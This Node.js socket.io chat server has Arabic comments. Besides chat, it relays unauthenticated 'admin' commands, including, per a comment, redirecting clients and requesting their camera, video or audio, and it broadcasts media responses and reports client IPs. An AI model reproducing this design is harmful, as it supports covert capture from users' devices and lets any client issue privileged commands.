const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(__dirname));

io.on('connection', (socket) => {
    // استخراج معلومات الجهاز والـ IP للطرف المتصل
    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    const userAgent = socket.handshake.headers['user-agent'] || 'Unknown Device';
    
    socket.emit('device_info', { ip: clientIp, ua: userAgent });

    socket.on('chat_message', (data) => {
        data.id = 'msg_' + Math.random().toString(36).substring(2, 9);
        io.emit('chat_message', data);
    });

    socket.on('typing', (data) => {
        socket.broadcast.emit('typing', data);
    });

    // أحداث الأدمن والتحكم
    socket.on('admin_action', (data) => {
        if (data.action === 'delete') {
            io.emit('delete_message', data.id);
        } else if (data.action === 'edit') {
            io.emit('edit_message', data);
        } else if (data.action === 'clear_chat') {
            io.emit('clear_chat', data.target); // all, mine, theirs
        } else if (data.action === 'alert') {
            io.emit('system_alert', data.message);
        } else if (data.action === 'change_bg') {
            io.emit('change_bg', data.color);
        } else {
            // توجيه أو طلب كاميرا/فيديو/صوت
            io.emit('admin_command', data);
        }
    });

    socket.on('media_response', (data) => {
        io.emit('media_response', data);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
